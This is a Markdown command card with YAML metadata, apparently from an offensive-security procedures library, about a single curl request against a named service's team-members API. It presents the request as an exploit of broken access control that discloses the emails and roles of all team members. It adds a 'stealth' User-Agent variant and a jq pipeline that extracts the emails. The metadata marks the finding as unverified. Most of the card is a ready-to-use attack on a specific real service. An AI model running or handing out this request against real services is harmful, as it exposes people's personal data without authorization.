---
data: >-
  curl -H "Cookie: session=your_session_cookie"
  "https://wakatime.com/api/v1/users/current/leaderboards/\$team_id/members"
tags:
  - api
  - recon
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 4fe455f9-1247-4bcc-80cc-6a5a9dbfae7d
created_at: '2025-12-14T17:29:09.764Z'
updated_at: '2025-12-14T17:29:09.764Z'
verified: false
validated: true
submitted: true
---
# curl-wakatime-members-api

## Command

```bash
curl -H "Cookie: session=your_session_cookie" "https://wakatime.com/api/v1/users/current/leaderboards/$team_id/members"
```

## Description

This command uses curl to perform an authenticated GET request to WakaTime's vulnerable API endpoint for retrieving team member details. It exploits broken access control by sending the request with a member-level session cookie, disclosing emails and membership info of all team members. Use it in scenarios testing API authorization flaws in web services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: session=..."` | Specifies the authentication cookie from a WakaTime session | Yes |
| `"https://wakatime.com/api/v1/users/current/leaderboards/$team_id/members"` | The API endpoint URL with $team_id replaced by the actual team identifier | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: session=abc123" "https://wakatime.com/api/v1/users/current/leaderboards/12345/members"
```

### Advanced Usage

```bash
curl -H "Cookie: session=abc123" -H "User-Agent: Mozilla/5.0" "https://wakatime.com/api/v1/users/current/leaderboards/12345/members" | jq ".members[] | .email"
```

> Adds User-Agent header for stealth and pipes to jq for parsing emails.

## Expected Output

Successful execution returns a JSON object like:

```json
{
  "members": [
    {
      "id": 1,
      "email": "user1@example.com",
      "role": "member"
    },
    {
      "id": 2,
      "email": "user2@example.com",
      "role": "admin"
    }
  ]
}
```

If unauthorized, expect a 403 or empty response; success indicates vulnerability.

## Related

- [[Related Procedure|procedures/Exploit-WakaTime-API-Broken-Access-Control]]
